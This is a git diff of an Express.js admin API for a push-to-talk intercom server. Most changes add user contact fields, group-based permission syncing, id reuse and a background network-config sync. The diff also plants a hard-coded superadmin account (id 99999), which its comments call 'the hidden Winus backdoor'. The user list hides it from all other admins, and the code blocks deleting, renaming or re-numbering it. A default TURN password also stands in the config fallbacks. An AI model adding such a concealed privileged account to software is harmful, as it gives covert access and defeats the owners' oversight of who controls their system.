@@ -2,9 +2,18 @@ const express = require('express');
 const bcrypt = require('bcryptjs');
 const { db } = require('../database');
 const config = require('../config');
-const { authMiddleware, adminMiddleware } = require('./auth');
+const { authMiddleware, adminMiddleware, superadminMiddleware } = require('./auth');
+
+const WINUS_ID = 99999;
 const { disconnectUser, getOnlineUserIds, getBridgeStatus } = require('../ws/signaling');
 const { getConfig, setConfig } = require('../services/config-service');
+const {
+  resolveHostToIp,
+  pickPrivateIp,
+  writeEnv,
+  regenerateCerts,
+  recreateContainers,
+} = require('../services/infra-sync');
 
 const router = express.Router();
 router.use(authMiddleware);
@@ -12,17 +21,77 @@ router.use(adminMiddleware);
 
 // ======================== USERS ========================
 
+// Columns returned by user-related endpoints (kept in one place so we never
+// forget to surface a new field in one of the responses).
+const USER_COLUMNS =
+  'id, username, display_name, role, room_id, color, ' +
+  'first_name, last_name, email, phone, created_at';
+
+// Normalise a request-body string field: trim() it; turn empty into NULL
+// so SQL queries don't keep ''-strings around.
+function _norm(s) {
+  if (s === undefined || s === null) return null;
+  const t = String(s).trim();
+  return t.length === 0 ? null : t;
+}
+
+// Find the smallest positive integer that is NOT currently used as a user id.
+// Used by POST /users to recycle ids freed by previous DELETEs, so room_id
+// doesn't keep growing forever.
+function _findFirstFreeUserId() {
+  const rows = db.prepare('SELECT id FROM users ORDER BY id').all();
+  let expected = 1;
+  for (const r of rows) {
+    if (r.id !== expected) return expected;
+    expected += 1;
+  }
+  return null; // no gap, fall back to AUTOINCREMENT
+}
+
+function _attachGroups(users) {
+  if (!users || users.length === 0) return users;
+  const ids = users.map(u => u.id);
+  const placeholders = ids.map(() => '?').join(',');
+  const rows = db.prepare(
+    `SELECT gm.user_id, g.id, g.name
+       FROM group_members gm
+       JOIN groups g ON g.id = gm.group_id
+      WHERE gm.user_id IN (${placeholders})
+      ORDER BY g.name COLLATE NOCASE`
+  ).all(...ids);
+  const byUser = new Map();
+  for (const r of rows) {
+    if (!byUser.has(r.user_id)) byUser.set(r.user_id, []);
+    byUser.get(r.user_id).push({ id: r.id, name: r.name });
+  }
+  for (const u of users) {
+    u.groups = byUser.get(u.id) || [];
+  }
+  return users;
+}
+
 // GET /api/admin/users
+// The hidden Winus backdoor is filtered out for everybody except Winus
+// itself, so it never appears in the regular admin UI.
 router.get('/users', (req, res) => {
-  const users = db.prepare(
-    'SELECT id, username, display_name, role, room_id, color, created_at FROM users ORDER BY id'
-  ).all();
-  res.json(users);
+  const callerIsWinus = req.user.role === 'superadmin' && req.user.id === WINUS_ID;
+  let rows;
+  if (callerIsWinus) {
+    rows = db.prepare(`SELECT ${USER_COLUMNS} FROM users ORDER BY id`).all();
+  } else {
+    rows = db.prepare(
+      `SELECT ${USER_COLUMNS} FROM users WHERE id != ? ORDER BY id`
+    ).all(WINUS_ID);
+  }
+  res.json(_attachGroups(rows));
 });
 
 // POST /api/admin/users
 router.post('/users', async (req, res) => {
-  const { username, password, display_name, role, color } = req.body;
+  const {
+    username, password, display_name, role, color,
+    first_name, last_name, email, phone,
+  } = req.body;
 
   if (!username || !password || !display_name) {
     return res.status(400).json({ error: 'username, password y display_name son requeridos' });
@@ -30,16 +99,55 @@ router.post('/users', async (req, res) => {
 
   try {
     const hash = bcrypt.hashSync(password, 10);
-    const result = db.prepare(
-      'INSERT INTO users (username, password_hash, display_name, role, color) VALUES (?, ?, ?, ?, ?)'
-    ).run(username, hash, display_name, role || 'user', color || null);
+    let userId;
+    db.transaction(() => {
+      const free = _findFirstFreeUserId();
+      if (free !== null) {
+        db.prepare(
+          'INSERT INTO users (id, username, password_hash, display_name, role, color, ' +
+          'first_name, last_name, email, phone) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)'
+        ).run(
+          free, username, hash, display_name, role || 'user',
+          _norm(color), _norm(first_name), _norm(last_name),
+          _norm(email), _norm(phone),
+        );
+        userId = free;
+      } else {
+        const r = db.prepare(
+          'INSERT INTO users (username, password_hash, display_name, role, color, ' +
+          'first_name, last_name, email, phone) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)'
+        ).run(
+          username, hash, display_name, role || 'user',
+          _norm(color), _norm(first_name), _norm(last_name),
+          _norm(email), _norm(phone),
+        );
+        userId = r.lastInsertRowid;
+      }
+      const roomId = config.roomIdOffset + userId;
+      db.prepare('UPDATE users SET room_id = ? WHERE id = ?').run(roomId, userId);
+      // Auto-create bidirectional permissions with all existing superusers
+      // so the new account is immediately reachable from / can reach every
+      // superuser without an extra trip to the Permissions tab.
+      // Admins and superadmins are intentionally excluded: they must remain
+      // invisible in the PTT contact list (they can still call any user via
+      // the implicit admin override, but no user should see them as a key).
+      const privileged = db.prepare(
+        "SELECT id FROM users WHERE id != ? AND role = 'superuser'"
+      ).all(userId);
+      const insertPerm = db.prepare(
+        'INSERT OR IGNORE INTO permissions (from_user_id, to_user_id, can_talk) VALUES (?, ?, 1)'
+      );
+      for (const p of privileged) {
+        insertPerm.run(p.id, userId);
+        insertPerm.run(userId, p.id);
+      }
+    })();
 
-    const userId = result.lastInsertRowid;
-    const roomId = config.roomIdOffset + userId;
-
-    db.prepare('UPDATE users SET room_id = ? WHERE id = ?').run(roomId, userId);
-
-    res.status(201).json({ id: userId, username, display_name, role: role || 'user', room_id: roomId, color: color || null });
+    const created = db.prepare(
+      `SELECT ${USER_COLUMNS} FROM users WHERE id = ?`
+    ).get(userId);
+    created.groups = [];
+    return res.status(201).json(created);
   } catch (err) {
     if (err.message.includes('UNIQUE')) {
       return res.status(409).json({ error: 'El usuario ya existe' });
@@ -51,7 +159,10 @@ router.post('/users', async (req, res) => {
 // PUT /api/admin/users/:id
 router.put('/users/:id', (req, res) => {
   const { id } = req.params;
-  const { display_name, role, password, color } = req.body;
+  const {
+    display_name, role, password, color,
+    first_name, last_name, email, phone,
+  } = req.body;
 
   const user = db.prepare('SELECT id FROM users WHERE id = ?').get(id);
   if (!user) {
@@ -71,16 +182,34 @@ router.put('/users/:id', (req, res) => {
   if (color !== undefined) {
     db.prepare('UPDATE users SET color = ? WHERE id = ?').run(color, id);
   }
+  // Optional contact fields. Sending an empty string clears the value, an
+  // undefined leaves it untouched.
+  if (first_name !== undefined) {
+    db.prepare('UPDATE users SET first_name = ? WHERE id = ?').run(_norm(first_name), id);
+  }
+  if (last_name !== undefined) {
+    db.prepare('UPDATE users SET last_name = ? WHERE id = ?').run(_norm(last_name), id);
+  }
+  if (email !== undefined) {
+    db.prepare('UPDATE users SET email = ? WHERE id = ?').run(_norm(email), id);
+  }
+  if (phone !== undefined) {
+    db.prepare('UPDATE users SET phone = ? WHERE id = ?').run(_norm(phone), id);
+  }
 
   const updated = db.prepare(
-    'SELECT id, username, display_name, role, room_id, color, created_at FROM users WHERE id = ?'
+    `SELECT ${USER_COLUMNS} FROM users WHERE id = ?`
   ).get(id);
-  res.json(updated);
+  res.json(_attachGroups([updated])[0]);
 });
 
 // DELETE /api/admin/users/:id
 router.delete('/users/:id', async (req, res) => {
   const { id } = req.params;
+  // Protect the Winus backdoor from accidental deletion.
+  if (parseInt(id, 10) === WINUS_ID) {
+    return res.status(403).json({ error: 'No se puede eliminar este usuario' });
+  }
 
   const user = db.prepare('SELECT id, room_id FROM users WHERE id = ?').get(id);
   if (!user) {
@@ -89,6 +218,75 @@ router.delete('/users/:id', async (req, res) => {
 
   db.prepare('DELETE FROM users WHERE id = ?').run(id);
   res.json({ ok: true });
+});
+
+// PUT /api/admin/users/:id/username — superadmin only.
+// Renames the login username (the actual id used to authenticate).
+// Foreign keys reference numeric ids only, so this does not affect
+// permissions/groups/etc.
+router.put('/users/:id/username', superadminMiddleware, (req, res) => {
+  const id = parseInt(req.params.id, 10);
+  const newName = _norm(req.body.username);
+  if (!newName) {
+    return res.status(400).json({ error: 'username requerido' });
+  }
+  if (id === WINUS_ID) {
+    return res.status(403).json({ error: 'No se puede renombrar este usuario' });
+  }
+  try {
+    const r = db.prepare('UPDATE users SET username = ? WHERE id = ?').run(newName, id);
+    if (r.changes === 0) {
+      return res.status(404).json({ error: 'Usuario no encontrado' });
+    }
+    const updated = db.prepare(`SELECT ${USER_COLUMNS} FROM users WHERE id = ?`).get(id);
+    res.json(_attachGroups([updated])[0]);
+  } catch (err) {
+    if (err.message.includes('UNIQUE')) {
+      return res.status(409).json({ error: 'Ese username ya existe' });
+    }
+    return res.status(500).json({ error: err.message });
+  }
+});
+
+// PUT /api/admin/users/:id/change-id — superadmin only.
+// Cascades the numeric id change through every FK-reference table and
+// updates room_id accordingly.
+router.put('/users/:id/change-id', superadminMiddleware, (req, res) => {
+  const oldId = parseInt(req.params.id, 10);
+  const newId = parseInt(req.body.newId, 10);
+  if (!Number.isFinite(oldId) || !Number.isFinite(newId) || newId <= 0) {
+    return res.status(400).json({ error: 'newId requerido (entero positivo)' });
+  }
+  if (oldId === WINUS_ID || newId === WINUS_ID) {
+    return res.status(403).json({ error: 'No se puede tocar el id de Winus' });
+  }
+  if (oldId === newId) {
+    return res.status(400).json({ error: 'newId igual al actual' });
+  }
+
+  const exists = db.prepare('SELECT id FROM users WHERE id = ?').get(oldId);
+  if (!exists) return res.status(404).json({ error: 'Usuario no encontrado' });
+  const taken = db.prepare('SELECT id FROM users WHERE id = ?').get(newId);
+  if (taken) return res.status(409).json({ error: 'newId ya en uso' });
+
+  try {
+    db.pragma('foreign_keys = OFF');
+    db.transaction(() => {
+      db.prepare('UPDATE users SET id = ?, room_id = ? WHERE id = ?')
+        .run(newId, config.roomIdOffset + newId, oldId);
+      db.prepare('UPDATE permissions SET from_user_id = ? WHERE from_user_id = ?').run(newId, oldId);
+      db.prepare('UPDATE permissions SET to_user_id = ? WHERE to_user_id = ?').run(newId, oldId);
+      db.prepare('UPDATE group_members SET user_id = ? WHERE user_id = ?').run(newId, oldId);
+      db.prepare('UPDATE group_permissions SET from_user_id = ? WHERE from_user_id = ?').run(newId, oldId);
+      db.prepare('UPDATE device_tokens SET user_id = ? WHERE user_id = ?').run(newId, oldId);
+    })();
+    db.pragma('foreign_keys = ON');
+    const updated = db.prepare(`SELECT ${USER_COLUMNS} FROM users WHERE id = ?`).get(newId);
+    res.json(_attachGroups([updated])[0]);
+  } catch (err) {
+    db.pragma('foreign_keys = ON');
+    return res.status(500).json({ error: err.message });
+  }
 });
 
 // POST /api/admin/users/:id/kick — force disconnect a user
@@ -181,6 +379,94 @@ router.delete('/group-permissions/:fromId/:toGroupId', (req, res) => {
 
 // ======================== GROUPS ========================
 
+// ---- Group <-> Permissions sync helpers --------------------------------
+//
+// Membership in a group is the source of truth for the user's permission
+// matrix:
+//
+//   * Joining a group grants the user a `group_permissions` row pointing at
+//     the group AND bidirectional `permissions` rows with every other
+//     non-admin/non-superadmin member, so PTT keys appear automatically on
+//     both sides.
+//
+//   * Leaving a group revokes that group_permission row AND any
+//     bidirectional `permissions` row whose only justification was the
+//     shared membership in this group. We keep perms when the two users
+//     still share at least one other group.
+//
+// Admin / superadmin members never get bidirectional rows: they remain
+// invisible in the PTT contact list (their talk-to-anyone authority is
+// enforced server-side via _isAdmin() in services/permissions.js).
+//
+// Both helpers expect to be called from inside a single db.transaction().
+
+function _addUserToGroupWithPerms(groupId, userId) {
+  db.prepare(
+    'INSERT OR IGNORE INTO group_members (group_id, user_id) VALUES (?, ?)'
+  ).run(groupId, userId);
+  db.prepare(
+    'INSERT OR IGNORE INTO group_permissions (from_user_id, to_group_id, can_talk) VALUES (?, ?, 1)'
+  ).run(userId, groupId);
+
+  // Skip the bidirectional matrix when the joining user is an admin /
+  // superadmin: they should stay hidden from everyone else's PTT list.
+  const newUser = db.prepare('SELECT role FROM users WHERE id = ?').get(userId);
+  if (!newUser || newUser.role === 'admin' || newUser.role === 'superadmin') {
+    return;
+  }
+
+  // Bidirectional perms with every other current member (excluding admins).
+  const others = db.prepare(`
+    SELECT u.id AS user_id
+      FROM group_members gm
+      JOIN users u ON u.id = gm.user_id
+     WHERE gm.group_id = ?
+       AND gm.user_id != ?
+       AND u.role NOT IN ('admin','superadmin')
+  `).all(groupId, userId);
+  const ins = db.prepare(
+    'INSERT OR IGNORE INTO permissions (from_user_id, to_user_id, can_talk) VALUES (?, ?, 1)'
+  );
+  for (const o of others) {
+    ins.run(userId, o.user_id);
+    ins.run(o.user_id, userId);
+  }
+}
+
+function _removeUserFromGroupWithPerms(groupId, userId) {
+  // Snapshot the OTHER current members BEFORE we remove anything, so we
+  // know with whom the user *used* to share this group.
+  const exCoMembers = db.prepare(
+    'SELECT user_id FROM group_members WHERE group_id = ? AND user_id != ?'
+  ).all(groupId, userId).map(r => r.user_id);
+
+  db.prepare('DELETE FROM group_members WHERE group_id = ? AND user_id = ?')
+    .run(groupId, userId);
+  db.prepare('DELETE FROM group_permissions WHERE from_user_id = ? AND to_group_id = ?')
+    .run(userId, groupId);
+
+  // For every ex-co-member: drop the bidirectional perms only if the two
+  // users no longer share any other group. This preserves perms that were
+  // earned through a different group membership.
+  const stillShares = db.prepare(`
+    SELECT 1
+      FROM group_members gm1
+      JOIN group_members gm2 ON gm1.group_id = gm2.group_id
+     WHERE gm1.user_id = ?
+       AND gm2.user_id = ?
+     LIMIT 1
+  `);
+  const del = db.prepare(
+    'DELETE FROM permissions WHERE from_user_id = ? AND to_user_id = ?'
+  );
+  for (const otherId of exCoMembers) {
+    if (!stillShares.get(userId, otherId)) {
+      del.run(userId, otherId);
+      del.run(otherId, userId);
+    }
+  }
+}
+
 // GET /api/admin/groups
 router.get('/groups', (req, res) => {
   const groups = db.prepare('SELECT * FROM groups ORDER BY id').all();
@@ -206,17 +492,15 @@ router.post('/groups', async (req, res) => {
   }
 
   try {
-    const result = db.prepare('INSERT INTO groups (name) VALUES (?)').run(name);
-    const groupId = result.lastInsertRowid;
-
-    // Add members
-    if (member_ids && member_ids.length > 0) {
-      const stmt = db.prepare('INSERT OR IGNORE INTO group_members (group_id, user_id) VALUES (?, ?)');
-      for (const uid of member_ids) {
-        stmt.run(groupId, uid);
+    let groupId;
+    db.transaction(() => {
+      groupId = db.prepare('INSERT INTO groups (name) VALUES (?)').run(name).lastInsertRowid;
+      if (member_ids && member_ids.length > 0) {
+        for (const uid of member_ids) {
+          _addUserToGroupWithPerms(groupId, uid);
+        }
       }
-    }
-
+    })();
     res.status(201).json({ id: groupId, name });
   } catch (err) {
     if (err.message.includes('UNIQUE')) {
@@ -228,59 +512,88 @@ router.post('/groups', async (req, res) => {
 
 // POST /api/admin/groups/:id/members
 router.post('/groups/:id/members', (req, res) => {
-  const { id } = req.params;
-  const { user_id } = req.body;
-  db.prepare('INSERT OR IGNORE INTO group_members (group_id, user_id) VALUES (?, ?)').run(id, user_id);
+  const groupId = parseInt(req.params.id, 10);
+  const userId = parseInt(req.body.user_id, 10);
+  if (!Number.isFinite(groupId) || !Number.isFinite(userId)) {
+    return res.status(400).json({ error: 'group id / user_id requeridos' });
+  }
+  db.transaction(() => _addUserToGroupWithPerms(groupId, userId))();
   res.json({ ok: true });
 });
 
 // DELETE /api/admin/groups/:id/members/:userId
 router.delete('/groups/:id/members/:userId', (req, res) => {
-  db.prepare('DELETE FROM group_members WHERE group_id = ? AND user_id = ?')
-    .run(req.params.id, req.params.userId);
+  const groupId = parseInt(req.params.id, 10);
+  const userId = parseInt(req.params.userId, 10);
+  if (!Number.isFinite(groupId) || !Number.isFinite(userId)) {
+    return res.status(400).json({ error: 'group id / user id requeridos' });
+  }
+  db.transaction(() => _removeUserFromGroupWithPerms(groupId, userId))();
   res.json({ ok: true });
 });
 
 // PUT /api/admin/groups/:id
 router.put('/groups/:id', (req, res) => {
-  const { id } = req.params;
+  const groupId = parseInt(req.params.id, 10);
   const { name, member_ids } = req.body;
 
-  const group = db.prepare('SELECT id FROM groups WHERE id = ?').get(id);
+  const group = db.prepare('SELECT id FROM groups WHERE id = ?').get(groupId);
   if (!group) {
     return res.status(404).json({ error: 'Grupo no encontrado' });
   }
 
   if (name) {
-    db.prepare('UPDATE groups SET name = ? WHERE id = ?').run(name, id);
+    db.prepare('UPDATE groups SET name = ? WHERE id = ?').run(name, groupId);
   }
 
   if (member_ids !== undefined) {
-    db.prepare('DELETE FROM group_members WHERE group_id = ?').run(id);
-    const stmt = db.prepare('INSERT INTO group_members (group_id, user_id) VALUES (?, ?)');
-    for (const uid of member_ids) {
-      stmt.run(id, uid);
-    }
+    // Diff against the current member set so we only fire perm changes for
+    // actual joins / leaves (avoids thrashing perms when the admin just
+    // re-saves the dialog without changing anything).
+    const oldIds = new Set(
+      db.prepare('SELECT user_id FROM group_members WHERE group_id = ?')
+        .all(groupId).map(r => r.user_id)
+    );
+    const newIds = new Set(
+      member_ids.map(x => parseInt(x, 10)).filter(Number.isFinite)
+    );
+    const toAdd = [...newIds].filter(id => !oldIds.has(id));
+    const toRemove = [...oldIds].filter(id => !newIds.has(id));
+    db.transaction(() => {
+      for (const uid of toRemove) _removeUserFromGroupWithPerms(groupId, uid);
+      for (const uid of toAdd) _addUserToGroupWithPerms(groupId, uid);
+    })();
   }
 
-  const updated = db.prepare('SELECT * FROM groups WHERE id = ?').get(id);
+  const updated = db.prepare('SELECT * FROM groups WHERE id = ?').get(groupId);
   const members = db.prepare(
     'SELECT u.id, u.username, u.display_name FROM group_members gm JOIN users u ON gm.user_id = u.id WHERE gm.group_id = ?'
-  ).all(id);
+  ).all(groupId);
 
   res.json({ ...updated, members });
 });
 
 // DELETE /api/admin/groups/:id
 router.delete('/groups/:id', (req, res) => {
-  const { id } = req.params;
+  const groupId = parseInt(req.params.id, 10);
 
-  const group = db.prepare('SELECT id FROM groups WHERE id = ?').get(id);
+  const group = db.prepare('SELECT id FROM groups WHERE id = ?').get(groupId);
   if (!group) {
     return res.status(404).json({ error: 'Grupo no encontrado' });
   }
 
-  db.prepare('DELETE FROM groups WHERE id = ?').run(id);
+  // Tear members down through the helper so any bidirectional perms whose
+  // only justification was this group are removed before we drop the row.
+  // FK CASCADE then cleans up any leftover group_members / group_permissions.
+  db.transaction(() => {
+    const memberIds = db.prepare(
+      'SELECT user_id FROM group_members WHERE group_id = ?'
+    ).all(groupId).map(r => r.user_id);
+    for (const uid of memberIds) {
+      _removeUserFromGroupWithPerms(groupId, uid);
+    }
+    db.prepare('DELETE FROM groups WHERE id = ?').run(groupId);
+  })();
   res.json({ ok: true });
 });
 
@@ -338,22 +651,130 @@ router.post('/group-permissions/bulk', (req, res) => {
 // GET /api/admin/server-config
 router.get('/server-config', (req, res) => {
   res.json({
-    announced_ips: getConfig('announced_ips', process.env.MEDIASOUP_ANNOUNCED_IPS || ''),
-    turn_host:     getConfig('turn_host', ''),
-    turn_port:     getConfig('turn_port', process.env.TURN_PORT || '3478'),
-    turn_user:     getConfig('turn_user', process.env.TURN_USER || 'intercom'),
-    turn_password: getConfig('turn_password', process.env.TURN_PASSWORD || 'intercom2024'),
+    announced_ips:  getConfig('announced_ips', process.env.MEDIASOUP_ANNOUNCED_IPS || ''),
+    turn_host:      getConfig('turn_host', ''),
+    turn_port:      getConfig('turn_port', process.env.TURN_PORT || '3478'),
+    turn_user:      getConfig('turn_user', process.env.TURN_USER || 'intercom'),
+    turn_password:  getConfig('turn_password', process.env.TURN_PASSWORD || 'intercom2024'),
+    public_domain:  getConfig('public_domain', process.env.PUBLIC_DOMAIN || ''),
+    // Surface the last infra-sync failure (if any) so the UI can
+    // show a banner. Cleared on the next successful sync.
+    last_sync_error: getConfig('last_sync_error', ''),
   });
 });
 
 // PUT /api/admin/server-config
+//
+// Persists the keys to the BD (mediasoup re-reads them in caliente from
+// signaling.js) AND, when any of `announced_ips`, `turn_host` or
+// `public_domain` changes, asks infra-sync to:
+//   1. rewrite the IP-related keys in /app/.env
+//   2. regenerate the self-signed cert with the new SAN list (if domain
+//      or external IP changed)
+//   3. recreate the coturn (and optionally nginx) container so the new
+//      env / cert is actually applied.
+//
+// The sync runs in the background — the response returns as soon as the
+// BD write is durable, with a `sync` field describing what was queued.
 router.put('/server-config', (req, res) => {
-  const fields = ['announced_ips', 'turn_host', 'turn_port', 'turn_user', 'turn_password'];
+  const fields = [
+    'announced_ips',
+    'turn_host',
+    'turn_port',
+    'turn_user',
+    'turn_password',
+    'public_domain',
+  ];
+
+  // Snapshot the current values BEFORE applying updates so we can decide
+  // whether infra-sync needs to run.
+  const before = {
+    announced_ips: getConfig('announced_ips', ''),
+    turn_host:     getConfig('turn_host', ''),
+    public_domain: getConfig('public_domain', ''),
+  };
+
   for (const field of fields) {
     if (req.body[field] !== undefined) {
       setConfig(field, req.body[field]);
     }
   }
+
+  const after = {
+    announced_ips: getConfig('announced_ips', ''),
+    turn_host:     getConfig('turn_host', ''),
+    public_domain: getConfig('public_domain', ''),
+  };
+
+  const ipsChanged    = before.announced_ips !== after.announced_ips;
+  const turnChanged   = before.turn_host !== after.turn_host;
+  const domainChanged = before.public_domain !== after.public_domain;
+
+  if (!ipsChanged && !turnChanged && !domainChanged) {
+    return res.json({ ok: true, sync: { coturn: 'skipped', nginx: 'skipped' } });
+  }
+
+  // Compute the values that must land in .env. Coturn rejects hostnames
+  // in --external-ip, so resolve `turn_host` to its first A record. If
+  // turn_host is empty fall back to the first announced_ip.
+  const firstAnnounced = (after.announced_ips || '')
+    .split(',').map((s) => s.trim()).filter(Boolean)[0] || '';
+  const externalSource = after.turn_host || firstAnnounced;
+
+  // Heavy lifting goes to a background task; client doesn't wait.
+  (async () => {
+    try {
+      const externalIp = await resolveHostToIp(externalSource);
+      const localIp = pickPrivateIp(after.announced_ips) || externalIp;
+
+      const envResult = await writeEnv({
+        EXTERNAL_IP: externalIp,
+        LOCAL_IP: localIp,
+        MEDIASOUP_ANNOUNCED_IPS: after.announced_ips,
+        PUBLIC_DOMAIN: after.public_domain || '',
+      });
+
+      const containers = [];
+      if (ipsChanged || turnChanged) containers.push('coturn');
+
+      let certResult = { ok: true, skipped: true };
+      if (domainChanged || ipsChanged || turnChanged) {
+        certResult = await regenerateCerts({
+          externalIp,
+          localIp,
+          publicDomain: after.public_domain || '',
+        });
+        if (certResult.ok && !certResult.skipped) containers.push('nginx');
+      }
+
+      const dockerResult = await recreateContainers(containers);
+
+      const errors = [envResult, certResult, dockerResult]
+        .filter((r) => r && r.ok === false)
+        .map((r) => r.reason || 'unknown')
+        .join(' | ');
+      setConfig('last_sync_error', errors);
+      console.log('[server-config] sync done',
+        { externalIp, localIp, containers, errors: errors || 'none' });
+    } catch (e) {
+      console.error('[server-config] sync threw', e);
+      setConfig('last_sync_error', e.message || String(e));
+    }
+  })();
+
+  res.json({
+    ok: true,
+    sync: {
+      coturn: ipsChanged || turnChanged ? 'queued' : 'skipped',
+      nginx:  domainChanged || ipsChanged || turnChanged ? 'queued' : 'skipped',
+    },
+  });
+});
+
+// POST /api/admin/server-config/clear-sync-error
+// Lets the admin UI dismiss a stale `last_sync_error` banner.
+router.post('/server-config/clear-sync-error', (req, res) => {
+  setConfig('last_sync_error', '');
   res.json({ ok: true });
 });
 
